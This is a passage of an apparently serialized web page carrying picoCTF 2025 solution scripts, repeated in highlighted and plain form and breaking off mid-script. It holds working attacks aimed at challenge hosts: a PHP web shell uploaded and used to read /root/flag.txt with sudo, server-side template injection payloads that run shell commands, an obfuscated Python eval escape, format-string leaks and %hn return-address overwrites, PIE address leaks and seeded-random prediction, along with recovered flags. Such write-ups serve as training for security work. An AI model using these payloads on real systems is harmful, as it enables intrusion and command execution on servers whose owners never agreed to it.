+                <span class="token operator">++</span>charindex<span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+
+            <span class="token keyword">if</span><span class="token punctuation">(</span>charindex <span class="token operator">==</span> <span class="token number">27</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+    <span class="token function">check</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// anything</span>
+    cout <span class="token operator">&lt;&lt;</span> realflag <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span> <span class="token comment">// picoCTF{0n3_bi7_4t_a_7im3}</span>
+    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+18:Tcbb,<span class="token keyword">import</span> subprocess
+
+port <span class="token operator">=</span> <span class="token number">54813</span>
+rules_template <span class="token operator">=</span> <span class="token triple-quoted-string string">"""
+import "hash"
+
+rule bf
+{{
+    condition:
+        hash.sha256(0, filesize) matches /^1b/ or
+        hash.sha256(0, filesize) matches /^8f/ or
+        hash.sha256(0, filesize) matches /^{}/
+}}
+"""</span>
+
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    h <span class="token operator">=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>zfill<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>  <span class="token comment"># 00, 01, ..., ff</span>
+    rules <span class="token operator">=</span> rules_template<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>h<span class="token punctuation">)</span>
+    process <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>Popen<span class="token punctuation">(</span>
+        <span class="token punctuation">[</span><span class="token string">"socat"</span><span class="token punctuation">,</span> <span class="token string">"-t60"</span><span class="token punctuation">,</span> <span class="token string">"-"</span><span class="token punctuation">,</span> <span class="token string-interpolation"><span class="token string">f"TCP:standard-pizzas.picoctf.net:</span><span class="token interpolation"><span class="token punctuation">{</span>port<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">]</span><span class="token punctuation">,</span>
+        stdin<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span>
+        stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE
+    <span class="token punctuation">)</span>
+    stdout<span class="token punctuation">,</span> stderr <span class="token operator">=</span> process<span class="token punctuation">.</span>communicate<span class="token punctuation">(</span><span class="token builtin">input</span><span class="token operator">=</span>rules<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span>h<span class="token punctuation">,</span> stdout<span class="token punctuation">)</span>
+
+<span class="token comment"># picoCTF{yara_rul35_r0ckzzz_a73309a8}</span>
+19:Ta60,<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"rescued-float.picoctf.net"</span><span class="token punctuation">,</span> <span class="token number">60129</span><span class="token punctuation">)</span>
+
+main <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">b" "</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
+main <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>main<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"main:"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+win <span class="token operator">=</span> main <span class="token operator">+</span> <span class="token number">0x12A7</span> <span class="token operator">-</span> <span class="token number">0x133D</span>
+win <span class="token operator">=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>win<span class="token punctuation">)</span>
+
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>win<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token comment"># picoCTF{b4s1c_p051t10n_1nd3p3nd3nc3_a267144a}</span>
+1a:Tda6,<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"rescued-float.picoctf.net"</span><span class="token punctuation">,</span> <span class="token number">64931</span><span class="token punctuation">)</span>
+
+p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"name:"</span><span class="token punctuation">)</span>
+payload <span class="token operator">=</span> <span class="token string">b"aaaaaaab.%8$p.%25$p."</span>  <span class="token comment"># buffer</span>
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+<span class="token comment"># %8$p: start of buffer</span>
+<span class="token comment"># %25$p: main</span>
+
+resp <span class="token operator">=</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b": "</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>
+    <span class="token string">"resp:"</span><span class="token punctuation">,</span> resp
+<span class="token punctuation">)</span>  <span class="token comment"># resp: b'aaaaaaab.0x6261616161616161.0x5fe907376400.\n enter the address to jump to, ex => 0x12345: '</span>
+
+main <span class="token operator">=</span> resp<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">b"."</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>
+main <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>main<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"main:"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+win <span class="token operator">=</span> main <span class="token operator">+</span> <span class="token number">0x136A</span> <span class="token operator">-</span> <span class="token number">0x1400</span>
+win <span class="token operator">=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>win<span class="token punctuation">)</span>
+
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>win<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token comment"># picoCTF{p13_5h0u1dn'7_134k_8c8ae861}</span>
+1b:Tadd,from pwn import *
+
+p = remote("shape-facility.picoctf.net", 60616)
+
+print(p.recvuntil("Try Shouting: \n"))
+
+
+def print_stack(p):
+    stack_addr_22p = 0
+
+    def resp2str(addresses):
+        result = []
+        for addr in addresses:
+            addr_str = addr.decode()
+            if addr_str == "(nil)":
+                high, low = "00000000", "00000000"
+            else:
+                num = int(addr_str, 16)
+                high = f"{(num >> 32) & 0xFFFFFFFF:08x}"
+                low = f"{num & 0xFFFFFFFF:08x}"
+            result.extend([low, high])
+        return " ".join(result)
+
+    for i in range(2, 40, 2):
+        p.sendline(
+            f"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@@@%{i}$p.%{i+1}$p@@@BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"
+        )
+        resp = p.recvline()
+        addresses = resp.split(b"@@@")[1].split(b".")
+        print(f"%{i:2}$p:", resp2str(addresses))
+
+        # notice that the [value of %20$p] is the [stack address of %22$p]
+        if i == 20:
+            stack_addr_22p = int(addresses[0].decode(), 16)
+
+    return stack_addr_22p
+
+
+stack_addr_22p = print_stack(p)
+print(f"stack_addr_22p: {hex(stack_addr_22p)}")
+"""
+% 2$p: 00000000 00000000 00000000 00000000
+% 4$p: 17c4230f 00005c20 00000000 00000000
+% 6$p: 41414141 41414141 41414141 41414141
+% 8$p: 41414141 41414141 41414141 41414141
+%10$p: 41414141 40414141 31254040 2e702430
+%12$p: 24333125 40404070 42424242 42424242
+%14$p: 42424242 42424242 42424242 42424242
+%16$p: 42424242 42424242 42424242 42424242
+%18$p: 0000000a 00000000 cd8ccd00 674cd41f
+%20$p: 9c3e5280 00007ffd(120cd413 00005c20)  <-- the value of %21$p is return address, ends with 0x413
+%22$p: 9c3e5320 00007ffd 9ed701ca 00007dd0
+%24$p: 9c3e52d0 00007ffd 9c3e53a8 00007ffd
+%26$p: 120cc040 00000001 120cd401 00005c20
+%28$p: 9c3e53a8 00007ffd 39525fe6 78889720
+%30$p: 00000001 00000000 00000000 00000000
+%32$p: 120cfd78 00005c20 9ef95000 00007dd0
+%34$p: 3a325fe6 78889720 9c105fe6 7cd292f2
+%36$p: 00000000 00007ffd 00000000 00000000
+%38$p: 00000000 00000000 00000001 00000000
+stack_addr_22p: 0x7ffd9c3e5280
+"""
+
+p.sendline(f"%21$p")
+ret_addr_resp = p.recvline()
+ret_addr = int(ret_addr_resp.split(b": ")[-1].strip(), 16)
+print(f"ret_addr: {hex(ret_addr)}")
+
+# notice that the [value of %20$p] is the [stack address of %22$p]
+# set [value of address that %20$p points to] = [stack address of %21$p]
+# which means set [value of %22$p] = [stack address of %21$p]
+p.sendline(f"%{(stack_addr_22p & 0xFFFF) - 0x8}c%20$hn")
+p.recvline()
+
+# set [value of address that %22$p points to] = [address of print_flag]
+# which means set [value of %21$p] = [address of print_flag]
+p.sendline(f"%{(ret_addr & 0xFFFF) - 0x1413 + 0x1269}c%22$hn")
+p.recvline()
+
+p.sendline("exit")
+print(p.recvall())
+
+# picoctf{f1ckl3_f0rmat_f1asc0}
+1c:T3359,<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"shape-facility.picoctf.net"</span><span class="token punctuation">,</span> <span class="token number">60616</span><span class="token punctuation">)</span>
+
+<span class="token keyword">print</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Try Shouting: \n"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+
+<span class="token keyword">def</span> <span class="token function">print_stack</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    stack_addr_22p <span class="token operator">=</span> <span class="token number">0</span>
+
+    <span class="token keyword">def</span> <span class="token function">resp2str</span><span class="token punctuation">(</span>addresses<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        result <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+        <span class="token keyword">for</span> addr <span class="token keyword">in</span> addresses<span class="token punctuation">:</span>
+            addr_str <span class="token operator">=</span> addr<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
+            <span class="token keyword">if</span> addr_str <span class="token operator">==</span> <span class="token string">"(nil)"</span><span class="token punctuation">:</span>
+                high<span class="token punctuation">,</span> low <span class="token operator">=</span> <span class="token string">"00000000"</span><span class="token punctuation">,</span> <span class="token string">"00000000"</span>
+            <span class="token keyword">else</span><span class="token punctuation">:</span>
+                num <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>addr_str<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
+                high <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span><span class="token punctuation">(</span>num <span class="token operator">>></span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFFFFFFFF</span><span class="token punctuation">:</span><span class="token format-spec">08x</span><span class="token punctuation">}</span></span><span class="token string">"</span></span>
+                low <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span>num <span class="token operator">&amp;</span> <span class="token number">0xFFFFFFFF</span><span class="token punctuation">:</span><span class="token format-spec">08x</span><span class="token punctuation">}</span></span><span class="token string">"</span></span>
+            result<span class="token punctuation">.</span>extend<span class="token punctuation">(</span><span class="token punctuation">[</span>low<span class="token punctuation">,</span> high<span class="token punctuation">]</span><span class="token punctuation">)</span>
+        <span class="token keyword">return</span> <span class="token string">" "</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>result<span class="token punctuation">)</span>
+
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>
+            <span class="token string-interpolation"><span class="token string">f"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@@@%</span><span class="token interpolation"><span class="token punctuation">{</span>i<span class="token punctuation">}</span></span><span class="token string">$p.%</span><span class="token interpolation"><span class="token punctuation">{</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">}</span></span><span class="token string">$p@@@BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"</span></span>
+        <span class="token punctuation">)</span>
+        resp <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        addresses <span class="token operator">=</span> resp<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">b"@@@"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">b"."</span><span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"%</span><span class="token interpolation"><span class="token punctuation">{</span>i<span class="token punctuation">:</span><span class="token format-spec">2</span><span class="token punctuation">}</span></span><span class="token string">$p:"</span></span><span class="token punctuation">,</span> resp2str<span class="token punctuation">(</span>addresses<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+        <span class="token comment"># notice that the [value of %20$p] is the [stack address of %22$p]</span>
+        <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token number">20</span><span class="token punctuation">:</span>
+            stack_addr_22p <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>addresses<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
+
+    <span class="token keyword">return</span> stack_addr_22p
+
+
+stack_addr_22p <span class="token operator">=</span> print_stack<span class="token punctuation">(</span>p<span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"stack_addr_22p: </span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">hex</span><span class="token punctuation">(</span>stack_addr_22p<span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+<span class="token triple-quoted-string string">"""
+% 2$p: 00000000 00000000 00000000 00000000
+% 4$p: 17c4230f 00005c20 00000000 00000000
+% 6$p: 41414141 41414141 41414141 41414141
+% 8$p: 41414141 41414141 41414141 41414141
+%10$p: 41414141 40414141 31254040 2e702430
+%12$p: 24333125 40404070 42424242 42424242
+%14$p: 42424242 42424242 42424242 42424242
+%16$p: 42424242 42424242 42424242 42424242
+%18$p: 0000000a 00000000 cd8ccd00 674cd41f
+%20$p: 9c3e5280 00007ffd(120cd413 00005c20)  &lt;-- the value of %21$p is return address, ends with 0x413
+%22$p: 9c3e5320 00007ffd 9ed701ca 00007dd0
+%24$p: 9c3e52d0 00007ffd 9c3e53a8 00007ffd
+%26$p: 120cc040 00000001 120cd401 00005c20
+%28$p: 9c3e53a8 00007ffd 39525fe6 78889720
+%30$p: 00000001 00000000 00000000 00000000
+%32$p: 120cfd78 00005c20 9ef95000 00007dd0
+%34$p: 3a325fe6 78889720 9c105fe6 7cd292f2
+%36$p: 00000000 00007ffd 00000000 00000000
+%38$p: 00000000 00000000 00000001 00000000
+stack_addr_22p: 0x7ffd9c3e5280
+"""</span>
+
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"%21$p"</span></span><span class="token punctuation">)</span>
+ret_addr_resp <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
+ret_addr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>ret_addr_resp<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">b": "</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"ret_addr: </span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">hex</span><span class="token punctuation">(</span>ret_addr<span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+
+<span class="token comment"># notice that the [value of %20$p] is the [stack address of %22$p]</span>
+<span class="token comment"># set [value of address that %20$p points to] = [stack address of %21$p]</span>
+<span class="token comment"># which means set [value of %22$p] = [stack address of %21$p]</span>
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"%</span><span class="token interpolation"><span class="token punctuation">{</span><span class="token punctuation">(</span>stack_addr_22p <span class="token operator">&amp;</span> <span class="token number">0xFFFF</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x8</span><span class="token punctuation">}</span></span><span class="token string">c%20$hn"</span></span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span class="token comment"># set [value of address that %22$p points to] = [address of print_flag]</span>
+<span class="token comment"># which means set [value of %21$p] = [address of print_flag]</span>
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"%</span><span class="token interpolation"><span class="token punctuation">{</span><span class="token punctuation">(</span>ret_addr <span class="token operator">&amp;</span> <span class="token number">0xFFFF</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x1413</span> <span class="token operator">+</span> <span class="token number">0x1269</span><span class="token punctuation">}</span></span><span class="token string">c%22$hn"</span></span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"exit"</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token comment"># picoctf{f1ckl3_f0rmat_f1asc0}</span>
+5:[["$","$Ld",null,{"src":"overview.jpg","width":"800px"}],["$","h2",null,{"className":"x-h1","children":"Web"}],["$","h3",null,{"className":"x-h2","children":"n0s4n1ty-1"}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Python"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"import requests\n\nurl = \"http://standard-pizzas.picoctf.net:49315/\"\nshell = '<?php system($_GET[\"cmd\"]); ?>'\nresp = requests.post(url + \"upload.php\", data={\"submit\": \"Upload File\"}, files={\n    \"fileToUpload\": (\"exp.php\", shell),\n})\nprint(resp.text, resp.status_code)  # The file exp.php has been uploaded Path: uploads/exp.php  200\n\ncmd = \"sudo cat /root/flag.txt\"\nresp = requests.get(url + \"uploads/exp.php?cmd=\" + cmd)\nprint(resp.text)\n\n# picoCTF{wh47_c4n_u_d0_wPHP_5f894f6c}\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$f"}}]}]]}],["$","h3",null,{"className":"x-h2","children":"WebSockFish"}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Python"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"import asyncio\nimport websockets\n\n\nasync def websocket_client():\n    uri = \"ws://verbal-sleep.picoctf.net:61344/ws/\"\n    async with websockets.connect(uri) as ws:\n        await ws.send(\"eval -100000\")\n        response = await ws.recv()\n        print(f\"Received: {response}\")\n        # Received: Huh???? How can I be losing this badly... I resign... here's your flag: picoCTF{c1i3nt_s1d3_w3b_s0ck3t5_a2a9bbe9}\n\n\nasyncio.run(websocket_client())\n\n# picoCTF{c1i3nt_s1d3_w3b_s0ck3t5_a2a9bbe9}\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$10"}}]}]]}],["$","h3",null,{"className":"x-h2","children":"SSTI1"}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Python"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"import requests\n\nurl = \"http://rescued-float.picoctf.net:50351/announce\"\n\npayload = \"{{1.__class__.__mro__[1].__subclasses__()[356]('cat flag',shell=True,stdout=-1).communicate()[0]}}\"\n\nresp = requests.post(url, data={\"content\": payload})\nprint(resp.text)\n\n# picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_df9a00a0}\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$11"}}]}]]}],["$","h3",null,{"className":"x-h2","children":"SSTI2"}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Python"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"import requests\n\nurl = \"http://shape-facility.picoctf.net:61943/announce\"\n\npayload = \"{{1|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')()|attr('__getitem__')(356)('cat flag',shell=True,stdout=-1)|attr('communicate')()}}\"\npayload = payload.replace(\"_\", \"\\\\x5f\")\n\nresp = requests.post(url, data={\"content\": payload})\nprint(resp.text)\n\n# picoCTF{sst1_f1lt3r_byp4ss_96a02202}\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$12"}}]}]]}],["$","h3",null,{"className":"x-h2","children":"3v@l"}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Python"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"import requests\n\nurl = \"http://shape-facility.picoctf.net:64106/execute\"\n\ncode = \"__import__('o''s').popen('ca''t '+chr(47)+'flag*').read()\"\n\nresp = requests.post(url, data={\"code\": code})\nprint(resp.text)\n\n# picoCTF{D0nt_Use_Unsecure_f@nctionsa4121ed2}\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"<span class=\"token keyword\">import</span> requests\n\nurl <span class=\"token operator\">=</span> <span class=\"token string\">\"http://shape-facility.picoctf.net:64106/execute\"</span>\n\ncode <span class=\"token operator\">=</span> <span class=\"token string\">\"__import__('o''s').popen('ca''t '+chr(47)+'flag*').read()\"</span>\n\nresp <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span> data<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token string\">\"code\"</span><span class=\"token punctuation\">:</span> code<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>resp<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># picoCTF{D0nt_Use_Unsecure_f@nctionsa4121ed2}</span>\n"}}]}]]}],["$","h3",null,{"className":"x-h2","children":"Apriti-sesamo"}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Python"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"$13"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$14"}}]}]]}],["$","h2",null,{"className":"x-h1","children":"Reversing"}],["$","h3",null,{"className":"x-h2","children":"Chronohack"}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Python"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"import socket\nimport random\nimport time\n\nport = 50408\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect((\"verbal-sleep.picoctf.net\", port))\n\nt1 = int(time.time() * 1000)\ndata = s.recv(1024)\nprint(data.decode())\nt2 = int(time.time() * 1000)\n\n\ndef get_random(length):\n    alphabet = \"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\"\n    random.seed(random.randint(t1, t2))\n    s = \"\"\n    for i in range(length):\n        s += random.choice(alphabet)\n    return s\n\n\nn = 0\nwhile n < 50:\n    user_guess = get_random(20)\n    s.sendall(user_guess.encode() + b\"\\n\")\n    response = s.recv(1024)\n    print(response.decode())\n    n += 1\n\ns.close()\n\n# picoCTF{UseSecure#$_Random@j3n3r@T0rsb5f8a5af}\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$15"}}]}]]}],["$","h3",null,{"className":"x-h2","children":"perplexed"}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"C++"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"$16"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$17"}}]}]]}],["$","h2",null,{"className":"x-h1","children":"General Skills"}],["$","h3",null,{"className":"x-h2","children":"YaraRules0x100"}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"I solved it by enumerating the file hash of three TPs one by one..."}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Python"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"import subprocess\n\nport = 54813\nrules_template = \"\"\"\nimport \"hash\"\n\nrule bf\n{{\n    condition:\n        hash.sha256(0, filesize) matches /^1b/ or\n        hash.sha256(0, filesize) matches /^8f/ or\n        hash.sha256(0, filesize) matches /^{}/\n}}\n\"\"\"\n\nfor i in range(256):\n    h = hex(i)[2:].zfill(2)  # 00, 01, ..., ff\n    rules = rules_template.format(h)\n    process = subprocess.Popen(\n        [\"socat\", \"-t60\", \"-\", f\"TCP:standard-pizzas.picoctf.net:{port}\"],\n        stdin=subprocess.PIPE,\n        stdout=subprocess.PIPE\n    )\n    stdout, stderr = process.communicate(input=rules.encode())\n    print(h, stdout)\n\n# picoCTF{yara_rul35_r0ckzzz_a73309a8}\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$18"}}]}]]}],["$","$Ld",null,{"src":"1.jpg","width":"100%"}],["$","h2",null,{"className":"x-h1","children":"Pwn"}],["$","h3",null,{"className":"x-h2","children":"PIE TIME"}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Python"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"from pwn import *\n\np = remote(\"rescued-float.picoctf.net\", 60129)\n\nmain = p.recvline().split(b\" \")[-1].strip()\nmain = int(main, 16)\nprint(\"main:\", hex(main))\n\nwin = main + 0x12A7 - 0x133D\nwin = hex(win)\n\np.sendline(str(win).encode())\nprint(p.recvall())\n\n# 